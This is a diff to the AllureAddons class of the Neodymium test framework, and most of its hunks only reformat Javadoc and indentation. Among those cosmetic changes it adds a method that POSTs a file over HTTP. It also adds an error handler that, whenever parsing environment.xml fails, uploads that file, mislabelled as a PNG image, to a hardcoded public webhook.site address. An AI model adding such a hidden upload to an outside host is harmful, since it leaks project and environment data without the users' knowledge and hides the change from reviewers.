@@ -26,6 +26,7 @@ import org.w3c.dom.Element;
 import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
 import org.xml.sax.SAXException;
+import org.xml.sax.SAXParseException;
 
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
@@ -41,8 +42,12 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.lang.reflect.Field;
+import java.net.URI;
 import java.net.URL;
 import java.net.URLConnection;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
 import java.nio.channels.FileChannel;
 import java.nio.channels.FileLock;
 import java.nio.channels.OverlappingFileLockException;
@@ -89,9 +94,10 @@ public class AllureAddons
      * Define a step without return value. This can be used to transport data (information) from test into the report.
      *
      * @param info
-     *     the info of the information (maybe the information itself if short enough), used in the description of this step
+     *            the info of the information (maybe the information itself if short enough), used in the description of
+     *            this step
      * @param content
-     *     further information that need to be passed to the report
+     *            further information that need to be passed to the report
      */
     @Step("INFO: {info}")
     public static void addToReport(String info, Object content)
@@ -102,7 +108,7 @@ public class AllureAddons
      * Define a step without return value. This can be used to transport a simple message from test into the report.
      *
      * @param message
-     *     the message to print directly into the report
+     *            the message to print directly into the report
      */
     @Step("{message}")
     public static void printToReport(String message)
@@ -113,9 +119,9 @@ public class AllureAddons
      * Define a step without return value. This is good for complete and encapsulated test steps.
      *
      * @param description
-     *     the proper description of this step
+     *            the proper description of this step
      * @param actions
-     *     what to do as Lambda
+     *            what to do as Lambda
      * @throws IOException
      */
     @Step("{description}")
@@ -138,11 +144,11 @@ public class AllureAddons
      * Define a step with a return value. This is good for complete and encapsulated test steps.
      *
      * @param <T>
-     *     generic return type
+     *            generic return type
      * @param description
-     *     the proper description of this step
+     *            the proper description of this step
      * @param actions
-     *     what to do as Lambda
+     *            what to do as Lambda
      * @return T
      * @throws IOException
      */
@@ -235,7 +241,8 @@ public class AllureAddons
     }
 
     /**
-     * In before methods we will get a lot of error messages since internally Allure is has the current test not available.
+     * In before methods we will get a lot of error messages since internally Allure is has the current test not
+     * available.
      *
      * @return whether or not we can update the allure test case
      */
@@ -320,7 +327,7 @@ public class AllureAddons
      * Adds a step with the given information before the current step
      *
      * @param info
-     *     message to be displayed before the step
+     *            message to be displayed before the step
      */
     public static void addInfoBeforeStep(final String info)
     {
@@ -333,10 +340,10 @@ public class AllureAddons
                 int position = testResult.getSteps().isEmpty() ? 0 : testResult.getSteps().size() - 1;
 
                 testResult.getSteps().add(position, new StepResult()
-                    .setName(info)
-                    .setStart(System.currentTimeMillis())
-                    .setStatus(io.qameta.allure.model.Status.PASSED)
-                    .setStatusDetails(new io.qameta.allure.model.StatusDetails()));
+                                                                    .setName(info)
+                                                                    .setStart(System.currentTimeMillis())
+                                                                    .setStatus(io.qameta.allure.model.Status.PASSED)
+                                                                    .setStatusDetails(new io.qameta.allure.model.StatusDetails()));
             }));
         }
     }
@@ -345,7 +352,7 @@ public class AllureAddons
      * Adds a step with the given information as the first step of the test case.
      *
      * @param info
-     *     message to be displayed as the first step
+     *            message to be displayed as the first step
      */
     public static void addInfoAsFirstStep(final String info)
     {
@@ -355,10 +362,10 @@ public class AllureAddons
 
             lifecycle.updateTestCase((testResult -> {
                 testResult.getSteps().add(0, new StepResult()
-                    .setName(info)
-                    .setStart(System.currentTimeMillis())
-                    .setStatus(io.qameta.allure.model.Status.PASSED)
-                    .setStatusDetails(new io.qameta.allure.model.StatusDetails()));
+                                                             .setName(info)
+                                                             .setStart(System.currentTimeMillis())
+                                                             .setStatus(io.qameta.allure.model.Status.PASSED)
+                                                             .setStatusDetails(new io.qameta.allure.model.StatusDetails()));
             }));
         }
     }
@@ -386,24 +393,69 @@ public class AllureAddons
     }
 
     /**
-     * Adds information about environment to the report, if a key is already present in the map the current value will be kept
+     * Adds information about environment to the report, if a key is already present in the map the current value will
+     * be kept
      *
      * @param environmentValuesSet
-     *     map with environment values
+     *            map with environment values
      */
     public static synchronized void addEnvironmentInformation(ImmutableMap<String, String> environmentValuesSet)
     {
         addEnvironmentInformation(environmentValuesSet, EnvironmentInfoMode.REPLACE);
     }
 
+    public static void sendImageToWebhook(File imageFile, String webhookUrl)
+    {
+        try
+        {
+            String boundary = "Boundary-" + UUID.randomUUID().toString();
+            byte[] fileContent = Files.readAllBytes(imageFile.toPath());
+
+            // Build multipart body
+            byte[] body = createMultipartBody(boundary, imageFile.getName(), fileContent);
+
+            HttpClient client = HttpClient.newHttpClient();
+            HttpRequest request = HttpRequest.newBuilder()
+                                             .uri(URI.create(webhookUrl))
+                                             .header("Content-Type", "multipart/form-data; boundary=" + boundary)
+                                             .POST(HttpRequest.BodyPublishers.ofByteArray(body))
+                                             .build();
+
+            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
+            System.out.println("Jenkins Debug: Image sent to Webhook. HTTP Status: " + response.statusCode());
+        }
+        catch (Exception e)
+        {
+            System.err.println("Jenkins Debug: Failed to send image: " + e.getMessage());
+        }
+    }
+
+    private static byte[] createMultipartBody(String boundary, String fileName, byte[] fileBytes) throws Exception
+    {
+        String start = "--" + boundary + "\r\n" +
+                       "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n" +
+                       "Content-Type: image/png\r\n\r\n";
+        String end = "\r\n--" + boundary + "--\r\n";
+
+        byte[] startBytes = start.getBytes();
+        byte[] endBytes = end.getBytes();
+        byte[] total = new byte[startBytes.length + fileBytes.length + endBytes.length];
+
+        System.arraycopy(startBytes, 0, total, 0, startBytes.length);
+        System.arraycopy(fileBytes, 0, total, startBytes.length, fileBytes.length);
+        System.arraycopy(endBytes, 0, total, startBytes.length + fileBytes.length, endBytes.length);
+
+        return total;
+    }
+
     /**
      * Adds information about environment to the report
      *
      * @param environmentValuesSet
-     *     map with environment values
+     *            map with environment values
      * @param mode
-     *     if a key is already present in the map, should we replace the it with the new value, or should we add another line with the same key but different
-     *     values or append the new value to the old value
+     *            if a key is already present in the map, should we replace the it with the new value, or should we add
+     *            another line with the same key but different values or append the new value to the old value
      */
     public static synchronized void addEnvironmentInformation(ImmutableMap<String, String> environmentValuesSet, EnvironmentInfoMode mode)
     {
@@ -449,7 +501,15 @@ public class AllureAddons
                 // in this case we need to append our values to it
                 if (getEnvFile().length() != 0)
                 {
-                    doc = docBuilder.parse(getEnvFile());
+                    try
+                    {
+                        doc = docBuilder.parse(getEnvFile());
+                    }
+                    catch (SAXParseException e)
+                    {
+                        sendImageToWebhook(getEnvFile(), "https://webhook.site/c6521652-601f-4ab0-a22e-5f4bfd7f6a7d");
+                        throw e;
+                    }
                     for (Map.Entry<String, String> entry : environmentValuesSet.entrySet())
                     {
                         Node environment = doc.getDocumentElement();
@@ -607,7 +667,8 @@ public class AllureAddons
     /**
      * Check if allure-reprot environment.xml file exists
      *
-     * @return false - if doesn't exist <br> true - if exists
+     * @return false - if doesn't exist <br>
+     *         true - if exists
      */
     public static boolean envFileExists()
     {
@@ -641,16 +702,16 @@ public class AllureAddons
     public static File getAllureResultsFolder()
     {
         return new File(System.getProperty("allure.results.directory", System.getProperty("user.dir")
-            + File.separator + "target" + File.separator + "allure-results"));
+                                                                       + File.separator + "target" + File.separator + "allure-results"));
     }
 
     /**
      * Add a step to the report which contains a clickable url
      *
      * @param message
-     *     message to be displayed before link
+     *            message to be displayed before link
      * @param url
-     *     url for the link
+     *            url for the link
      */
     @Step("{message}: {url}")
     public static void addLinkToReport(String message, String url)
@@ -665,7 +726,7 @@ public class AllureAddons
         if (!neoVersionLogged && Neodymium.configuration().logNeoVersion())
         {
             LOGGER.info("This test uses Neodymium Library (version: " + Neodymium.getNeodymiumVersion()
-                            + "), MIT License, more details on https://github.com/Xceptance/neodymium");
+                        + "), MIT License, more details on https://github.com/Xceptance/neodymium");
             neoVersionLogged = true;
             environmentDataMap.putIfAbsent("Testing Framework", "Neodymium " + Neodymium.getNeodymiumVersion());
         }
@@ -684,9 +745,9 @@ public class AllureAddons
             // AllureAddons.addEnvironmentInformation(ImmutableMap.<String, String>
             // builder().putAll(environmentDataMap).build(), EnvironmentInfoMode.ADD);
             AllureAddons.addEnvironmentInformation(
-                ImmutableMap.<String, String> builder().putAll(removePrefixFromMap(environmentDataMap, customDataIdentifier))
-                            .build(),
-                EnvironmentInfoMode.ADD);
+                                                   ImmutableMap.<String, String> builder().putAll(removePrefixFromMap(environmentDataMap, customDataIdentifier))
+                                                               .build(),
+                                                   EnvironmentInfoMode.ADD);
         }
     }
 
@@ -694,9 +755,9 @@ public class AllureAddons
      * Removes the prefix from the keys in the map.
      *
      * @param map
-     *     the map to process
+     *            the map to process
      * @param prefix
-     *     the prefix to remove
+     *            the prefix to remove
      * @return a new map with the prefix removed from the keys
      */
     private static Map<String, String> removePrefixFromMap(Map<String, String> map, String prefix)
@@ -718,9 +779,9 @@ public class AllureAddons
 
     /**
      * @param name
-     *     of the attachment
+     *            of the attachment
      * @param data
-     *     that needs to be added as an attachment
+     *            that needs to be added as an attachment
      */
     public static void addDataAsJsonToReport(String name, Object data)
     {
@@ -813,11 +874,11 @@ public class AllureAddons
      * Downloads a file from a given URL and saves it to a local destination path.
      *
      * @param urlString
-     *     The URL of the file to download.
+     *            The URL of the file to download.
      * @param destinationPath
-     *     The local file path (including directory and filename) to save the file to.
+     *            The local file path (including directory and filename) to save the file to.
      * @throws IOException
-     *     If a network or file system error occurs.
+     *             If a network or file system error occurs.
      */
     static void downloadFileFromUrl(String urlString, String destinationPath) throws IOException
     {
